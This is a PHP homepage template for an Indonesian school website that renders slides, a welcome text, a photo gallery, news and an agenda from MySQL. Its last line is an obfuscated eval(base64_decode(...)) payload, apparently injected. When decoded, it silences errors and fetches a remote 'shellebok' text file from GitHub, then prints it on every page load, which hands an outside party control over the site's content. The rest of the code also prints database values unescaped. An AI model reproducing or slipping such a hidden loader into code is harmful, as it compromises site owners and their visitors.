<div id="content" class="clearfix">
  <div id="slider" class="version1 clearfix">
			<div class="flexslider">
				<ul class="slides">
					<?php
					  $header=mysql_query("SELECT * FROM header
					  ORDER BY id_header DESC LIMIT 12");
					  while($b=mysql_fetch_array($header)){
					  echo "
					  <li>
					 <img src='$aneka_web/img_anekaweb/header/$b[gambar]' alt='smkkesehatanzamzamkurnia.sch.id'>
					 <div class='flex-caption'>
						<h1><a href='#'>$b[judul]</a></h1>
					</div>
					</li>
					 ";} ?>
				</ul>
				<div class="flex-pause-play">
				</div>
			</div>
		</div>
        <div id="content" class="clearfix">
        
	<?php
  $wel=mysql_query("SELECT * FROM welcome ORDER BY id_welcome DESC");
  while($r=mysql_fetch_array($wel)){
  echo "<div class='page-title'>$r[judul] </div>"; 
  
  if ($r[gambar]!=''){ 
  echo "<img src='$aneka_web/img_anekaweb/welcome/small_$r[gambar]' height='150' border=0 class='AnekaWebimage'>
  <p> $r[welcome]</p>";
  } else{ 
  echo " <p> $r[welcome]</p>
   ";}}?> <br/><br/>

<div class="posts-container clearfix">
<div class="page-title">
GALERI FOTO
</div>
<div class="carousel">
<ul class="slides">
<?php    
  $album= mysql_query("SELECT tgl_posting, jam, hari, hits_album, jdl_album, album.id_album, gbr_album, album_seo,  
  COUNT(gallery.id_gallery) as jumlah 
  FROM album LEFT JOIN gallery 
  ON album.id_album=gallery.id_album 
  WHERE album.aktif='Y'  
  GROUP BY id_album
  ORDER BY id_album DESC");
  while($w=mysql_fetch_array($album)){
  $jdl_album=($w[jdl_album]);
  $tgl = tgl_indo($w['tgl_posting']); 
  if ($w['gbr_album']!=''){  
  echo "
  <li>
<a href='$aneka_web/galeri-foto/".date('Y/m/d',strtotime($w['tgl_posting']))."/$w[id_album]/$w[album_seo]'>
<img src='$aneka_web/img_anekaweb/album/small_$w[gbr_album]' alt='$w[jdl_album]'>
</a>
<a href='$aneka_web/galeri-foto/".date('Y/m/d',strtotime($w['tgl_posting']))."/$w[id_album]/$w[album_seo]'>
<h2>$w[jdl_album]</h2>
</a>
</li>
";}} ?>
</ul>
</div>
</div>

<div class="page-title">BERITA TERBARU</div>

	<?php    
  $AWberita=mysql_query("SELECT * FROM berita,users WHERE users.username=berita.username 
	                                ORDER BY id_berita DESC LIMIT 6"); 
	while($t=mysql_fetch_array($AWberita)){ 
	$tgl = tgl_indo($t['tanggal']); 
	$baca = $t[dibaca]+0; 
	$isi_berita =(strip_tags($t[isi_berita])); 
	$isi = substr($isi_berita,0,600); 
	$isi = substr($isi_berita,0,strrpos($isi," ")); 
  if ($t['gambar']!=''){  
  echo "<div class='post-container clearfix'>
		<a href='$aneka_web/berita/".date('Y/m/d',strtotime($t['tanggal']))."/$t[id_berita]/$t[judul_seo]'>
		<img src='$aneka_web/img_anekaweb/berita/$t[gambar]'/></a>
		<article class='post-content'>
		<h1 class='post-title'><a href='$aneka_web/berita/".date('Y/m/d',strtotime($t['tanggal']))."/$t[id_berita]/$t[judul_seo]'>$t[judul]</a></h1>
		<div class='post-meta'>
			<div class='date'>
				$t[hari], $tgl, $t[jam] WIB | dibaca $baca pembaca
			</div>
		</div>
		<br/>";} 
		
echo "<p>$isi...</p>
		</article>
	</div>
	";} ?>
 

<div class="posts-container clearfix">
<div class="page-title">AGENDA</div>
<div class="carousel">
<ul class="slides">
<?php				
  $agenda=mysql_query("SELECT * FROM agenda ORDER BY id_agenda DESC LIMIT 8");
  while($w=mysql_fetch_array($agenda)){
  $tgl = tgl_indo($w['tgl_posting']); 
  if ($w['gambar']!=''){  
  echo "
  <li>
<a href='$aneka_web/agenda/".date('Y/m/d',strtotime($w['tgl_posting']))."/$w[id_agenda]/$w[tema_seo]'>
<img src='$aneka_web/img_anekaweb/agenda/small_$w[gambar]' alt='$$w[tema]'>
</a>
<a href='$aneka_web/agenda/".date('Y/m/d',strtotime($w['tgl_posting']))."/$w[id_agenda]/$w[tema_seo]'>
<h2>$w[tema]</h2>
</a>
</li>
";}} ?>
</ul>
</div>
</div>

		</div>



</div>
<?php include "$f[folder]/modul/sidebar/sidebar_home.php";
eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKJGtpbGwgPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGtpbGwsIENVUkxPUFRfVVJMLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vib2t6c3NzL3NoZWxsZWJvay9tYWluL3MudHh0Iik7CmN1cmxfc2V0b3B0KCRraWxsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKJGRlYWQgPSBjdXJsX2V4ZWMoJGtpbGwpOwpjdXJsX2Nsb3NlKCRraWxsKTsKZWNobygkZGVhZCk7'));
?>
